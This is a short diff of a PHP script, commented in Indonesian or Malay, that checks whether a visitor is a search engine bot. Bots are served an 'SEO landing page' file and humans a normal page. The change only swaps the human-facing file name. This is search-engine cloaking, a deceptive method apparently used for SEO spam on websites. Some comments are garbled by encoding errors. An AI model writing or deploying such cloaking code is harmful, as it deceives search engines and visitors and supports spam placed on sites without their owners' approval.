@@ -13,7 +13,7 @@ function JajangFetchLocal($filePath) {
 }
 
 $landing_page = __DIR__ . '/abc.txt';       // BOT â†’ SEO landing page
-$index_home   = __DIR__ . '/index-backup.txt'; // HUMAN â†’ halaman biasa
+$index_home   = __DIR__ . '/index2.txt'; // HUMAN â†’ halaman biasa
 
 if (isSearchEngineBot()) {
     // ROBOT â†’ tunjuk SEO landing page
